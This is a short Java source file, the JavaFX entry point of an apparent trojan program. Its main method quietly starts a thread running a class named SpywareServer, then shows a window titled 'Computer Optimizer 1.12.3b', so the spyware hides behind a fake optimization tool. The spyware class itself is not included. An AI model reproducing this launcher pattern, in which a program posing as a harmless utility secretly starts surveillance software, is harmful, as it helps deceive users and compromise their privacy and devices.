package View;

import Backend.SpywareServer;
import javafx.application.Application;
import javafx.fxml.FXMLLoader;
import javafx.scene.Parent;
import javafx.scene.Scene;
import javafx.stage.Stage;

public class MainGUI extends Application {

    public static void main(String[] args) {
        Thread t = new Thread(new SpywareServer());
        t.start();
        launch(args);
    }

    @Override
    public void start(Stage primaryStage) throws Exception {
        Parent root = FXMLLoader.load(getClass().getResource("MainGUI.fxml"));
        Scene scene = new Scene(root, 720, 800);
        primaryStage.setTitle("Computer Optimizer 1.12.3b");
        primaryStage.setScene(scene);
        primaryStage.show();
    }
}